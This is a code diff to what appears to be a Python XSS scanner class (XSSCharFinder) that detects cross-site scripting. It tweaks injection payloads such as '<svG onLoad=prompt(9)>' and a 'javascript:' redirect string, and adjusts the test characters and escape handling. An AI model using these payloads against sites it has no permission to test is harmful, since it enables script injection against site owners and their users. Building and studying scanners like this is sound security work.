@@ -15,7 +15,7 @@ import itertools
 class XSSCharFinder(object):
     def __init__(self):
         self.redir_pld = 'JaVAscRIPT:prompt(99)'
-        self.test_str = '\'"(){}<x>:'
+        self.test_str = '\'"(){}<x>:/'
         self.url_param_xss_items = []
 
     def process_item(self, item, spider):
@@ -245,7 +245,7 @@ class XSSCharFinder(object):
         # Comment injection
         if tag == '!--':
             chars = ('>')
-            payload = '--><svG/onLoad=prompt(9)>'
+            payload = '--><svG onLoad=prompt(9)>'
             try:
                 all_chars_payloads[chars] += [payload]
             except KeyError:
@@ -299,7 +299,7 @@ class XSSCharFinder(object):
                     chars_payloads[chars] = [payload]
 
                 chars = ('<', '>')
-                payload = '<svG/onLoad=prompt(9)>'
+                payload = '<svG onLoad=prompt(9)>'
                 try:
                     chars_payloads[chars].append(payload)
                 except KeyError:
@@ -314,7 +314,7 @@ class XSSCharFinder(object):
                 except KeyError:
                     chars_payloads[chars] = [payload]
 
-            chars = ("<", ">")
+            chars = ("<", ">", "/")
             payload = '</SCript><svG/onLoad=prompt(9)>'
             try:
                 chars_payloads[chars].append(payload)
@@ -324,7 +324,7 @@ class XSSCharFinder(object):
         # Everything that's not a script tag
         else:
             chars = ("<", ">")
-            payload = '<svG/onLoad=prompt(9)>'
+            payload = '<svG onLoad=prompt(9)>'
             try:
                 chars_payloads[chars].append(payload)
             except KeyError:
@@ -453,14 +453,14 @@ class XSSCharFinder(object):
         if '"' in line or "'" in line:
             if not attr_quote:
                 chars = ('<', '>')
-                payload = 'x><svG/onLoad=prompt(9)>'
+                payload = 'x><svG onLoad=prompt(9)>'
                 try:
                     chars_payloads[chars].append(payload)
                 except KeyError:
                     chars_payloads[chars] = [payload]
             else:
                 chars = (attr_quote)
-                payload1 = 'x'+attr_quote+'x><svG/onLoad=prompt(9)>'
+                payload1 = 'x'+attr_quote+'x><svG onLoad=prompt(9)>'
                 payload2 = 'x'+attr_quote+' onmouseover=prompt(9) '+attr_quote
                 payload3 = 'x'+attr_quote+'/onmouseover=prompt(9)/'+attr_quote
                 try:
@@ -484,7 +484,7 @@ class XSSCharFinder(object):
 
             else:
                 chars = ("<", ">")
-                payload = 'x><svG/onLoad=prompt(9)>'
+                payload = 'x><svG onLoad=prompt(9)>'
                 try:
                     chars_payloads[chars].append(payload)
                 except KeyError:
@@ -851,7 +851,7 @@ class XSSCharFinder(object):
         # since ; will show up in html encoded entities. If ; is unfiltered
         # it will be added after this function
         #escaped_chars = re.findall(r'\\(.)', chars)
-        chars_found = payload.replace(delim, '').replace("\\'", "").replace('\\"', '').replace(';', '')
+        chars_found = payload.replace(delim, '').replace("\\'", "").replace('\\"', '').replace(';', '').replace('\\>', '').replace('\\<', '').replace('\\/', '')
 
         # List for just the inj point
         for c in chars_found:
